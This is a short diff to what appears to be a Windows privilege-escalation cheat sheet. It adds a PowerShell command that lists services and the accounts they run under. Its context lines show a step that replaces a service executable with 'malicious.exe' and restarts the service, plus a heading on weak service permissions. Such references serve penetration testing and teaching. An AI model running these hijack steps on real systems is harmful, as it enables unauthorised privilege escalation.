@@ -375,6 +375,11 @@ cmd /c copy /Y malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.e
 sc start SecurityService
 ```
 
+````cmd
+# List all services and users
+Get-WmiObject Win32_Service | Select-Object Name, StartName, State | Format-Table -AutoSize
+````
+
 #### Weak Service Permissions
 ```cmd
 # Step 1: Check service permissions
